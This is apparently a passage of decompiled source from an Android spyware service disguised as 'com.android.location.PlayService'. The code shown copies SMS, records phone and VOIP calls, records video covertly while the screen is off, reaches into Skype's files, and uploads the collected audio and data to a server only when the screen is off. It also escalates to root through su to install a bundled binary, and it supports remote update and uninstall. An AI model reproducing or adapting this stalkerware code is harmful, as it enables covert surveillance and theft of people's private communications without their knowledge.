      paramString = new SipProfile.Builder("24---", "sip.zadarma.com");
      FLOG("SC2");
      paramString.setPassword("j3---");
      FLOG("SC3");
      this.me = paramString.build();
      FLOG("SC3.5");
      this.sipManager.open(this.me);
      FLOG("SC4");
      this.sipManager.setRegistrationListener(this.me.getUriString(), new SipRegistrationListener()
      {
        public void onRegistering(String paramAnonymousString) {}
        
        public void onRegistrationDone(String paramAnonymousString, long paramAnonymousLong) {}
        
        public void onRegistrationFailed(String paramAnonymousString1, int paramAnonymousInt, String paramAnonymousString2) {}
      });
      FLOG("try call");
      paramString = initiateCall(str);
      return paramString;
    }
    catch (Exception paramString)
    {
      EXCEPT(paramString, "sip 1 Connection Error.");
    }
    return "Error";
  }
  
  public void StartCallRecord(String paramString)
  {
    if (iCallRecordState == 1)
    {
      FLOG("StartCallRecord:Already recording");
      return;
    }
    new CallRecorder(1, paramString).start();
  }
  
  public String StartSMSCopier()
  {
    FLOG("StartSMSCopier");
    if ((this.thSMSCopier == null) || (!this.thSMSCopier.isAlive()))
    {
      putEvent(res.getString(2130968581) + " SMSCopier");
      this.thSMSCopier = new SMSCopier();
      FLOG("SMS copier was no alive, start it");
      try
      {
        this.thSMSCopier.start();
        return "new ThreadSMS starter";
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "StartSMSCopier");
      }
    }
    FLOG("Thread SMS seems to be alive, dont start");
    return "Thread SMS seems to be alive, dont start";
  }
  
  public String StartThread(int paramInt)
  {
    if (paramInt == 0) {
      return StartUploader();
    }
    if (paramInt == 1) {
      return StartSMSCopier();
    }
    if (paramInt == 2) {
      return SMSReceiver.CreateAudioThread();
    }
    if (paramInt == 3) {
      return SMSReceiver.CreateCommandor();
    }
    return "Unknown thread ID";
  }
  
  public String StartUploader()
  {
    if ((this.thUploader == null) || (!this.thUploader.isAlive()))
    {
      putEvent(res.getString(2130968581) + " Uploader");
      FLOG("Uploader was no alive, start it");
      this.thUploader = new Uploader();
      try
      {
        this.thUploader.start();
        return "Thread was dead, restart";
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "StartUploader");
      }
    }
    for (;;)
    {
      return "Thread is ok, skip any move";
      FLOG("Thread upload seems to be alive, skip start");
    }
  }
  
  public int StartVOIPRecord()
  {
    int j = 0;
    FLOG("Starting new VOIP recording");
    if (iCallRecordState == 1)
    {
      FLOG("Cancel VOIP rec, call is being recorded");
      j = 2;
    }
    label448:
    do
    {
      return j;
      if (this.iVOIPRecordState == 1)
      {
        FLOG("Cancel VOIP rec, VOIP alread recording");
        return 5;
      }
      this.iVOIPRecordState = 1;
      FLOG("AudioRECORDING:INTERRUPT");
      SMSReceiver.PauseAudioRecord();
      if (recorder == null) {
        recorder = new MediaRecorder();
      }
      if (recorder == null)
      {
        this.iVOIPRecordState = 0;
        return 3;
      }
      int k = 0;
      FileDescriptor localFileDescriptor = null;
      FileOutputStream localFileOutputStream2 = null;
      FileOutputStream localFileOutputStream1 = localFileOutputStream2;
      Object localObject1 = localFileDescriptor;
      int i;
      try
      {
        String str = "voip" + getCurrentTime() + ".tmp";
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileDescriptor;
        localFileOutputStream2 = context.openFileOutput(str, 0);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        localFileDescriptor = localFileOutputStream2.getFD();
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG(str);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        VOIPRecorderOutputFile = str;
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("0");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("1=" + recorder);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        recorder.setOutputFile(localFileDescriptor);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("2");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        recorder.setAudioSource(6);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("3");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        recorder.setOutputFormat(1);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("4");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        recorder.setAudioEncoder(1);
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("5");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        recorder.prepare();
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("6");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        recorder.start();
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("7");
        localFileOutputStream1 = localFileOutputStream2;
        localObject1 = localFileOutputStream2;
        FLOG("VOIPRecording " + str);
        i = k;
        if (localFileOutputStream2 == null) {}
      }
      catch (Exception localException)
      {
        for (;;)
        {
          k = 1;
          localObject1 = localFileOutputStream1;
          EXCEPT(localException, "Record start failed, killing VOIP");
          localObject1 = localFileOutputStream1;
          localException.printStackTrace();
          i = k;
          if (localFileOutputStream1 != null) {
            try
            {
              localFileOutputStream1.close();
              i = k;
            }
            catch (IOException localIOException1)
            {
              i = k;
            }
          }
        }
      }
      finally
      {
        if (localIOException1 != null) {}
        try
        {
          localIOException1.close();
          throw localObject2;
        }
        catch (IOException localIOException2)
        {
          for (;;) {}
        }
      }
      try
      {
        localFileOutputStream2.close();
        i = k;
      }
      catch (IOException localIOException3)
      {
        i = k;
        break label448;
      }
    } while (i == 0);
    recorder.release();
    recorder = null;
    this.iVOIPRecordState = 0;
    return 4;
  }
  
  public String StartVideoRecord(int paramInt1, int paramInt2)
  {
    FLOG("StartVideoRecord()");
    int i = paramInt2;
    if (paramInt2 > 1) {
      i = 0;
    }
    if (paramInt1 < 1)
    {
      FLOG("Delay is zero");
      return "Delay is zero";
    }
    if (paramInt1 > 600)
    {
      FLOG("too much video");
      return "Delay is too big, max 600sec";
    }
    PowerManager localPowerManager = (PowerManager)context.getSystemService("power");
    if ((localPowerManager != null) && (localPowerManager.isScreenOn()))
    {
      FLOG("Screen is active now, cannot record");
      return "Screen is active now, cannot record";
    }
    if (CameraActivity.IsRecordingNow()) {
      return "Camera busy";
    }
    FLOG("Activity created");
    this.videorecorder = new VideoRecorder(paramInt1, i);
    try
    {
      this.videorecorder.start();
      FLOG("Handler created");
      return "Video record task created";
    }
    catch (Exception localException)
    {
      for (;;)
      {
        EXCEPT(localException, "StartVideoRecorder");
      }
    }
  }
  
  public void StopCallRecord()
  {
    new CallRecorder(2, "").start();
  }
  
  public int StopVOIPRecord()
  {
    FLOG("StopVOIPRecord");
    if (this.iVOIPRecordState == 0)
    {
      FLOG("NOT RECORDGING");
      return 1;
    }
    if (recorder == null)
    {
      FLOG("recorder was dead, cannot stop");
      return 2;
    }
    recorder.stop();
    recorder.reset();
    recorder.release();
    recorder = null;
    FLOG("recorder = null;");
    this.iVOIPRecordState = 0;
    File localFile = new File(filesPath + "/" + VOIPRecorderOutputFile);
    if ((localFile != null) && (localFile.exists()))
    {
      ContentValues localContentValues = new ContentValues();
      localContentValues.put("filename", VOIPRecorderOutputFile);
      localContentValues.put("calldate", Long.valueOf(getCurrentTime()));
      localContentValues.put("filesize", Long.valueOf(localFile.length()));
      localContentValues.put("name", "voip");
      localContentValues.put("number", Integer.valueOf(0));
      localContentValues.put("duration", Long.valueOf(localFile.length()));
      ref.getContentResolver().insert(BackupData.CONTENT_URI, localContentValues);
      FLOG("return;");
      return 0;
    }
    FLOG("Cannot find recorded VOIP file:" + VOIPRecorderOutputFile);
    return 3;
  }
  
  public void UnInstallApplication(String paramString)
  {
    paramString = Uri.parse(paramString.toString());
    if (paramString != null) {
      startActivity(new Intent("android.intent.action.DELETE", paramString));
    }
  }
  
  public void Update(String paramString)
  {
    if (paramString == null) {}
    do
    {
      return;
      this.thUpdater = new Updater(paramString);
    } while ((this.thUpdater == null) || (this.thUpdater.isAlive()));
    this.thUpdater.start();
  }
  
  public String UpdateSkypePath(String paramString)
  {
    FLOG("UpdateSkypePath()");
    paramString = findApplication("com.skype.raider") + "/files/" + paramString;
    FLOG("UpdateSkypePath=" + paramString);
    return paramString;
  }
  
  public int UploadAudioDataToServer()
  {
    int i = 0;
    for (;;)
    {
      try
      {
        FLOG("___2:" + "myaudio");
        Object localObject = new File(getFilesDir() + "/" + "myaudio");
        FLOG(" file = " + ((File)localObject).length() + ((File)localObject).exists());
        if ((((File)localObject).exists()) && ((((File)localObject).length() < 56L) || (iDropSendPacket == 2)))
        {
          FLOG("Audio packet is broken or DROP SEND PACKET, deleting size=" + ((File)localObject).length());
          ((File)localObject).delete();
        }
        if (iDropSendPacket == 2)
        {
          FLOG("DROP audio packet command came");
          iDropSendPacket = 0;
        }
        if (!((File)localObject).exists())
        {
          FLOG("NO PACKET FILE AVAILABLE " + ((File)localObject).length());
          if (CreateAudioUploadPacket("myaudio") == 0)
          {
            FLOG("Audio file IS EMPTY, deleting, dont send");
            if (!((File)localObject).exists()) {
              break label347;
            }
            ((File)localObject).delete();
            return 0;
          }
          FLOG("CREATED FILE PACKET");
          FLOG("___4");
          if (!bKnockOffScreenOnly) {
            break label296;
          }
          localObject = (PowerManager)context.getSystemService("power");
          if ((localObject == null) || (!((PowerManager)localObject).isScreenOn())) {
            break;
          }
          FLOG("screen is on, skip knock due to bKnockOffScreenOnly");
          return 0;
        }
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "UploadAudioDataToServer ");
        return 0;
      }
      FLOG("PACKET FILE WAS previously created");
    }
    FLOG("pm=null or screen is off");
    label296:
    FLOG("Sending data");
    i = SendData("myaudio", 1);
    FLOG("___5");
    if ((i != 2) && (i != 3))
    {
      FLOG("UploadDataToServer_9");
      SaveSettings();
      FLOG("UploadDataToServer_10");
      i = 4;
      label347:
      return i;
    }
    return 3;
  }
  
  public int UploadDataToServer()
  {
    for (;;)
    {
      try
      {
        FLOG("___1");
        FLOG("___2:" + "mydata");
        Object localObject = new File(getFilesDir() + "/" + "mydata");
        FLOG(" file = " + ((File)localObject).length() + ((File)localObject).exists());
        if ((((File)localObject).exists()) && ((((File)localObject).length() < 56L) || (iDropSendPacket == 1) || (iDropSendPacket == 3)))
        {
          FLOG("Packet is broken or DROP SEND PACKET, deleting size=" + ((File)localObject).length());
          ((File)localObject).delete();
        }
        if ((iDropSendPacket == 1) || (iDropSendPacket == 3))
        {
          FLOG("DROP packet command came");
          iDropSendPacket = (byte)(iDropSendPacket - 1);
        }
        if (!((File)localObject).exists())
        {
          FLOG("NO PACKET FILE AVAILABLE " + ((File)localObject).length());
          if (CreateUploadPacket("mydata") != 0) {
            return 2;
          }
          FLOG("CREATED FILE PACKET");
          FLOG("___4");
          if (getCurrentTime() - this.iKnock > 3600000L)
          {
            this.iKnock = getCurrentTime();
            FLOG("Knock#10 has come, fetch old ");
            lLastCallListIDServer -= 3600000L;
            if (!bKnockOffScreenOnly) {
              break label373;
            }
            localObject = (PowerManager)context.getSystemService("power");
            if ((localObject == null) || (!((PowerManager)localObject).isScreenOn())) {
              break;
            }
            FLOG("screen is on, skip knock due to bKnockOffScreenOnly");
            return 0;
          }
        }
        else
        {
          FLOG("PACKET FILE WAS previously created");
          continue;
        }
        FLOG("Too early to update lLastCallListIDServer " + (getCurrentTime() - this.iKnock) / 1000L);
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "UploadDataToServer ");
        return 0;
      }
    }
    FLOG("pm=null or screen is off");
    label373:
    FLOG("Sending data");
    UpdateState(res.getString(2130968599), false, bCanSu);
    int i = SendData("mydata", 0);
    FLOG("___5,res=" + i);
    if (i == 9) {
      return 9;
    }
    while (i == 1)
    {
      FLOG("UploadDataToServer_9");
      SaveSettings();
      FLOG("UploadDataToServer_10");
      break;
    }
    return 3;
  }
  
  /* Error */
  boolean Vold()
  {
    // Byte code:
    //   0: ldc_w 6309
    //   3: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   9: getstatic 579	com/android/location/PlayService:CAN	B
    //   12: if_icmpeq +11 -> 23
    //   15: ldc_w 6311
    //   18: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   21: iconst_0
    //   22: ireturn
    //   23: aconst_null
    //   24: astore 4
    //   26: aconst_null
    //   27: astore 7
    //   29: aconst_null
    //   30: astore 8
    //   32: aload 4
    //   34: astore 6
    //   36: aload 7
    //   38: astore 5
    //   40: new 864	java/lang/StringBuilder
    //   43: dup
    //   44: ldc_w 6313
    //   47: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   50: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   53: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   56: ldc_w 6315
    //   59: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   62: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   65: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   68: pop
    //   69: aload 4
    //   71: astore 6
    //   73: aload 7
    //   75: astore 5
    //   77: aload_0
    //   78: invokevirtual 2047	com/android/location/PlayService:getAssets	()Landroid/content/res/AssetManager;
    //   81: astore 9
    //   83: aload 9
    //   85: ifnonnull +23 -> 108
    //   88: aload 8
    //   90: astore 4
    //   92: aload 4
    //   94: ifnull -73 -> 21
    //   97: aload 4
    //   99: invokevirtual 2076	java/io/InputStream:close	()V
    //   102: iconst_0
    //   103: ireturn
    //   104: astore 4
    //   106: iconst_0
    //   107: ireturn
    //   108: aload 7
    //   110: astore 5
    //   112: aload 9
    //   114: ldc_w 6317
    //   117: invokevirtual 2061	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   120: astore 6
    //   122: aload 6
    //   124: astore 4
    //   126: aload 4
    //   128: ifnonnull +104 -> 232
    //   131: aload 4
    //   133: astore 6
    //   135: aload 4
    //   137: astore 5
    //   139: ldc_w 6319
    //   142: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   145: goto -53 -> 92
    //   148: astore 4
    //   150: aload 6
    //   152: astore 5
    //   154: aload 4
    //   156: ldc_w 6321
    //   159: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   162: aload 6
    //   164: ifnull -143 -> 21
    //   167: aload 6
    //   169: invokevirtual 2076	java/io/InputStream:close	()V
    //   172: iconst_0
    //   173: ireturn
    //   174: astore 4
    //   176: iconst_0
    //   177: ireturn
    //   178: astore 8
    //   180: iconst_0
    //   181: ifeq +19 -> 200
    //   184: aload 4
    //   186: astore 6
    //   188: aload 7
    //   190: astore 5
    //   192: new 1700	java/lang/NullPointerException
    //   195: dup
    //   196: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   199: athrow
    //   200: aload 4
    //   202: astore 6
    //   204: aload 7
    //   206: astore 5
    //   208: aload 8
    //   210: ldc_w 6323
    //   213: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   216: iconst_0
    //   217: ifeq -196 -> 21
    //   220: new 1700	java/lang/NullPointerException
    //   223: dup
    //   224: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   227: athrow
    //   228: astore 4
    //   230: iconst_0
    //   231: ireturn
    //   232: aload 4
    //   234: astore 6
    //   236: aload 4
    //   238: astore 5
    //   240: ldc_w 4291
    //   243: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   246: aload 4
    //   248: astore 6
    //   250: aload 4
    //   252: astore 5
    //   254: new 1250	java/io/File
    //   257: dup
    //   258: new 864	java/lang/StringBuilder
    //   261: dup
    //   262: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   265: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   268: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   271: ldc_w 6315
    //   274: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   277: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   280: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   283: astore 7
    //   285: aload 4
    //   287: astore 6
    //   289: aload 4
    //   291: astore 5
    //   293: new 864	java/lang/StringBuilder
    //   296: dup
    //   297: ldc_w 6325
    //   300: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   303: aload 7
    //   305: invokevirtual 1277	java/io/File:length	()J
    //   308: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   311: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   314: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   317: aload 4
    //   319: astore 6
    //   321: aload 4
    //   323: astore 5
    //   325: aload 4
    //   327: invokevirtual 2072	java/io/InputStream:available	()I
    //   330: i2l
    //   331: lstore_2
    //   332: aload 4
    //   334: astore 6
    //   336: aload 4
    //   338: astore 5
    //   340: new 864	java/lang/StringBuilder
    //   343: dup
    //   344: ldc_w 4297
    //   347: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   350: lload_2
    //   351: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   354: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   357: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   360: aload 4
    //   362: astore 6
    //   364: aload 4
    //   366: astore 5
    //   368: aload 7
    //   370: invokevirtual 1277	java/io/File:length	()J
    //   373: lload_2
    //   374: lcmp
    //   375: ifeq +609 -> 984
    //   378: aload 4
    //   380: astore 6
    //   382: aload 4
    //   384: astore 5
    //   386: ldc_w 6327
    //   389: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   392: aload 4
    //   394: astore 6
    //   396: aload 4
    //   398: astore 5
    //   400: ldc_w 6329
    //   403: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   406: pop
    //   407: aload 4
    //   409: astore 6
    //   411: aload 4
    //   413: astore 5
    //   415: new 864	java/lang/StringBuilder
    //   418: dup
    //   419: ldc_w 6331
    //   422: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   425: aload 4
    //   427: invokevirtual 2072	java/io/InputStream:available	()I
    //   430: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   433: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   436: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   439: aload 4
    //   441: astore 6
    //   443: aload 4
    //   445: astore 5
    //   447: new 1250	java/io/File
    //   450: dup
    //   451: new 864	java/lang/StringBuilder
    //   454: dup
    //   455: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   458: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   461: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   464: ldc_w 6333
    //   467: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   470: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   473: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   476: invokevirtual 1257	java/io/File:exists	()Z
    //   479: ifne +69 -> 548
    //   482: aload 4
    //   484: astore 6
    //   486: aload 4
    //   488: astore 5
    //   490: getstatic 585	com/android/location/PlayService:ref	Lcom/android/location/PlayService;
    //   493: invokevirtual 4302	com/android/location/PlayService:getBaseContext	()Landroid/content/Context;
    //   496: ldc_w 6317
    //   499: iconst_0
    //   500: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   503: astore 8
    //   505: aload 8
    //   507: ifnull +380 -> 887
    //   510: sipush 1024
    //   513: newarray byte
    //   515: astore 5
    //   517: aload 4
    //   519: aload 5
    //   521: invokevirtual 2075	java/io/InputStream:read	([B)I
    //   524: istore_1
    //   525: iload_1
    //   526: iconst_m1
    //   527: if_icmpne +302 -> 829
    //   530: aload 8
    //   532: ifnull +16 -> 548
    //   535: aload 4
    //   537: astore 6
    //   539: aload 4
    //   541: astore 5
    //   543: aload 8
    //   545: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   548: aload 4
    //   550: astore 6
    //   552: aload 4
    //   554: astore 5
    //   556: new 864	java/lang/StringBuilder
    //   559: dup
    //   560: ldc_w 4314
    //   563: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   566: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   569: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   572: ldc_w 6335
    //   575: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   578: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   581: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   584: pop
    //   585: aload 4
    //   587: astore 6
    //   589: aload 4
    //   591: astore 5
    //   593: ldc_w 6337
    //   596: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   599: pop
    //   600: aload 4
    //   602: astore 6
    //   604: aload 4
    //   606: astore 5
    //   608: ldc_w 6339
    //   611: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   614: pop
    //   615: aload 4
    //   617: astore 6
    //   619: aload 4
    //   621: astore 5
    //   623: ldc_w 6341
    //   626: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   629: aload 4
    //   631: astore 6
    //   633: aload 4
    //   635: astore 5
    //   637: new 864	java/lang/StringBuilder
    //   640: dup
    //   641: ldc_w 6313
    //   644: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   647: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   650: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   653: ldc_w 6315
    //   656: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   659: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   662: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   665: pop
    //   666: aload 4
    //   668: astore 6
    //   670: aload 4
    //   672: astore 5
    //   674: new 1250	java/io/File
    //   677: dup
    //   678: new 864	java/lang/StringBuilder
    //   681: dup
    //   682: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   685: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   688: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   691: ldc_w 6315
    //   694: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   697: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   700: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   703: astore 7
    //   705: aload 4
    //   707: astore 6
    //   709: aload 4
    //   711: astore 5
    //   713: aload 7
    //   715: invokevirtual 1257	java/io/File:exists	()Z
    //   718: ifeq +186 -> 904
    //   721: aload 4
    //   723: astore 6
    //   725: aload 4
    //   727: astore 5
    //   729: aload 7
    //   731: invokevirtual 1277	java/io/File:length	()J
    //   734: lload_2
    //   735: lcmp
    //   736: ifne +168 -> 904
    //   739: aload 4
    //   741: astore 6
    //   743: aload 4
    //   745: astore 5
    //   747: ldc_w 6343
    //   750: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   753: aload 4
    //   755: astore 6
    //   757: aload 4
    //   759: astore 5
    //   761: aload 4
    //   763: invokevirtual 2076	java/io/InputStream:close	()V
    //   766: aload 4
    //   768: astore 6
    //   770: aload 4
    //   772: astore 5
    //   774: new 864	java/lang/StringBuilder
    //   777: dup
    //   778: ldc_w 4334
    //   781: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   784: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   787: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   790: ldc_w 6315
    //   793: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   796: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   799: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   802: pop
    //   803: aload 4
    //   805: astore 6
    //   807: aload 4
    //   809: astore 5
    //   811: ldc_w 6345
    //   814: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   817: aload 4
    //   819: ifnull +8 -> 827
    //   822: aload 4
    //   824: invokevirtual 2076	java/io/InputStream:close	()V
    //   827: iconst_1
    //   828: ireturn
    //   829: aload 8
    //   831: aload 5
    //   833: iconst_0
    //   834: iload_1
    //   835: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   838: goto -321 -> 517
    //   841: astore 7
    //   843: aload 8
    //   845: ifnull +16 -> 861
    //   848: aload 4
    //   850: astore 6
    //   852: aload 4
    //   854: astore 5
    //   856: aload 8
    //   858: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   861: aload 4
    //   863: astore 6
    //   865: aload 4
    //   867: astore 5
    //   869: aload 7
    //   871: athrow
    //   872: astore 4
    //   874: aload 5
    //   876: ifnull +8 -> 884
    //   879: aload 5
    //   881: invokevirtual 2076	java/io/InputStream:close	()V
    //   884: aload 4
    //   886: athrow
    //   887: aload 4
    //   889: astore 6
    //   891: aload 4
    //   893: astore 5
    //   895: ldc_w 2088
    //   898: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   901: goto -353 -> 548
    //   904: aload 4
    //   906: astore 6
    //   908: aload 4
    //   910: astore 5
    //   912: ldc_w 6347
    //   915: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   918: aload 4
    //   920: astore 6
    //   922: aload 4
    //   924: astore 5
    //   926: aload 4
    //   928: invokevirtual 2076	java/io/InputStream:close	()V
    //   931: aload 4
    //   933: astore 6
    //   935: aload 4
    //   937: astore 5
    //   939: new 864	java/lang/StringBuilder
    //   942: dup
    //   943: ldc_w 4334
    //   946: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   949: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   952: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   955: ldc_w 6315
    //   958: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   961: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   964: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   967: pop
    //   968: aload 4
    //   970: ifnull -949 -> 21
    //   973: aload 4
    //   975: invokevirtual 2076	java/io/InputStream:close	()V
    //   978: iconst_0
    //   979: ireturn
    //   980: astore 4
    //   982: iconst_0
    //   983: ireturn
    //   984: aload 4
    //   986: astore 6
    //   988: aload 4
    //   990: astore 5
    //   992: ldc_w 6349
    //   995: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   998: goto -245 -> 753
    //   1001: astore 5
    //   1003: goto -803 -> 200
    //   1006: astore 5
    //   1008: goto -147 -> 861
    //   1011: astore 5
    //   1013: goto -465 -> 548
    //   1016: astore 4
    //   1018: goto -191 -> 827
    //   1021: astore 5
    //   1023: goto -139 -> 884
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1026	0	this	PlayService
    //   524	311	1	i	int
    //   331	404	2	l	long
    //   24	74	4	localObject1	Object
    //   104	1	4	localIOException1	IOException
    //   124	12	4	localObject2	Object
    //   148	7	4	localException1	Exception
    //   174	27	4	localIOException2	IOException
    //   228	638	4	localIOException3	IOException
    //   872	102	4	localObject3	Object
    //   980	9	4	localIOException4	IOException
    //   1016	1	4	localIOException5	IOException
    //   38	953	5	localObject4	Object
    //   1001	1	5	localIOException6	IOException
    //   1006	1	5	localIOException7	IOException
    //   1011	1	5	localIOException8	IOException
    //   1021	1	5	localIOException9	IOException
    //   34	953	6	localObject5	Object
    //   27	703	7	localFile	File
    //   841	29	7	localObject6	Object
    //   30	59	8	localObject7	Object
    //   178	31	8	localException2	Exception
    //   503	354	8	localFileOutputStream	FileOutputStream
    //   81	32	9	localAssetManager	AssetManager
    // Exception table:
    //   from	to	target	type
    //   97	102	104	java/io/IOException
